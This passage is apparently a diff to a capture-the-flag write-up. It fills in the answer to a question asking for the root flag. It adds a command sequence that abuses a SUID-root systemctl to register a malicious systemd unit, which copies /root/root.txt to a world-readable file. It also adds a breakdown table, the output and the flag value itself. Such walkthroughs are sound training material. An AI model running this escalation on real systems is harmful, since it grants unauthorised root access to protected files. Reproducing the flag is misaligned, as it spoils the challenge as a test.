@@ -779,7 +779,44 @@ Because `systemctl` is SUID root, the `ExecStart` command runs with root privile
 
 ### Q19 What is the root flag value?
 
-==Answer==
+==Answer== `a58ff8579f0a9270368d33a9966c7fd5`
+<div align="center">
+<br>
+<br>
+</div>
+
+**Command:**
+
+```
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/rootflag.txt; chmod 666 /tmp/rootflag.txt"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+cat /tmp/rootflag.txt
+```
+
+**Breakdown:**
+
+|Component|Purpose|
+|---|---|
+|`TF=$(mktemp).service`|Create a unique temp filename ending in `.service` for the unit file.|
+|`echo '[Service]...' > $TF`|Write a systemd unit whose `ExecStart` copies the root-only flag to a world-readable file.|
+|`/bin/systemctl link $TF`|Register the unit file by its full path.|
+|`/bin/systemctl enable --now $TF`|Enable and immediately start the unit; because systemctl is SUID root, `ExecStart` runs as root.|
+|`cat /tmp/rootflag.txt`|Read the flag from the world-readable copy.|
+
+**Result:**
+
+```
+Created symlink /etc/systemd/system/tmp.2kr1TZTbLc.service -> /tmp/tmp.2kr1TZTbLc.service.
+Created symlink /etc/systemd/system/multi-user.target.wants/tmp.2kr1TZTbLc.service -> /tmp/tmp.2kr1TZTbLc.service.
+
+a58ff8579f0a9270368d33a9966c7fd5
+```
 <div align="center">
 <br>
 <br>
